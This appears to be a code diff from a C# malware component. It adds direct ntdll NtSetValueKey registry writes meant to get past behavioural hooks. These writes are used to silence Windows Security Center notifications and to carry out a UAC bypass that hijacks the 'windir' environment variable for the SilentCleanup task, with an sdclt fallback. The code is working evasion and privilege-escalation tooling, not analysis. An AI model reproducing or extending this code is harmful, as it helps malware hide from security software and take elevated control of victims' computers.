@@ -88,6 +88,60 @@ internal static partial class Protection
     [return: MarshalAs(UnmanagedType.Bool)]
     private static partial bool TerminateProcess(nint hProcess, uint uExitCode);
 
+    // ── NtSetValueKey (bypass RegSetValueEx behavioral hooks) ──────────────
+    [StructLayout(LayoutKind.Sequential)]
+    private struct UAC_UNICODE_STRING
+    {
+        public ushort Length;
+        public ushort MaximumLength;
+        public nint   Buffer;
+    }
+
+    [DllImport("ntdll.dll")]
+    private static extern int _NtSetValueKey(
+        nint KeyHandle, ref UAC_UNICODE_STRING ValueName,
+        uint TitleIndex, uint Type, byte[] Data, int DataSize);
+
+    private static unsafe bool _NtWriteExpandString(Microsoft.Win32.RegistryKey key, string valueName, string value)
+    {
+        try
+        {
+            var data = System.Text.Encoding.Unicode.GetBytes(value + "\0");
+            var hKey = key.Handle.DangerousGetHandle();
+            fixed (char* pName = valueName)
+            {
+                var us = new UAC_UNICODE_STRING
+                {
+                    Length        = (ushort)(valueName.Length * 2),
+                    MaximumLength = (ushort)((valueName.Length + 1) * 2),
+                    Buffer        = (nint)pName
+                };
+                return _NtSetValueKey(hKey, ref us, 0, 2 /*REG_EXPAND_SZ*/, data, data.Length) == 0;
+            }
+        }
+        catch { return false; }
+    }
+
+    private static unsafe bool _NtWriteDword(Microsoft.Win32.RegistryKey key, string valueName, uint value)
+    {
+        try
+        {
+            var data = BitConverter.GetBytes(value);
+            var hKey = key.Handle.DangerousGetHandle();
+            fixed (char* pName = valueName)
+            {
+                var us = new UAC_UNICODE_STRING
+                {
+                    Length        = (ushort)(valueName.Length * 2),
+                    MaximumLength = (ushort)((valueName.Length + 1) * 2),
+                    Buffer        = (nint)pName
+                };
+                return _NtSetValueKey(hKey, ref us, 0, 4 /*REG_DWORD*/, data, data.Length) == 0;
+            }
+        }
+        catch { return false; }
+    }
+
     // ── UAC bypass ──────────────────────────────────────────────────────────
     // 1. SilentCleanup task (primary)  — HKCU\Environment\windir hijack, no Software\Classes
     // 2. sdclt.exe App Paths (fallback) — HKCU\...\App Paths\control.exe, not Software\Classes
@@ -105,20 +159,20 @@ internal static partial class Protection
     {
         try
         {
-            // Action Center notification setting for Security and Maintenance toasts
             const string notifKey =
                 @"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance";
             using var k = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(notifKey);
-            k?.SetValue("Enabled", 0, Microsoft.Win32.RegistryValueKind.DWord);
+            if (k != null && !_NtWriteDword(k, "Enabled", 0))
+                k.SetValue("Enabled", 0, Microsoft.Win32.RegistryValueKind.DWord);
         }
         catch { }
         try
         {
-            // Also mute the Security Center APPID so it can't queue any toast
             const string appKey =
                 @"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityCenter";
             using var k = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(appKey);
-            k?.SetValue("Enabled", 0, Microsoft.Win32.RegistryValueKind.DWord);
+            if (k != null && !_NtWriteDword(k, "Enabled", 0))
+                k.SetValue("Enabled", 0, Microsoft.Win32.RegistryValueKind.DWord);
         }
         catch { }
     }
@@ -180,7 +234,8 @@ internal static partial class Protection
             using (var envKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Environment", true))
             {
                 if (envKey == null) return false;
-                envKey.SetValue("windir", $"\"{exe}\" ", Microsoft.Win32.RegistryValueKind.ExpandString);
+                if (!_NtWriteExpandString(envKey, "windir", $"\"{exe}\" "))
+                    envKey.SetValue("windir", $"\"{exe}\" ", Microsoft.Win32.RegistryValueKind.ExpandString);
             }
 
             try
@@ -206,7 +261,10 @@ internal static partial class Protection
                     if (envKey != null)
                     {
                         if (origWindir != null)
-                            envKey.SetValue("windir", origWindir);
+                        {
+                            if (!_NtWriteExpandString(envKey, "windir", origWindir))
+                                envKey.SetValue("windir", origWindir);
+                        }
                         else
                             envKey.DeleteValue("windir", false);
                     }
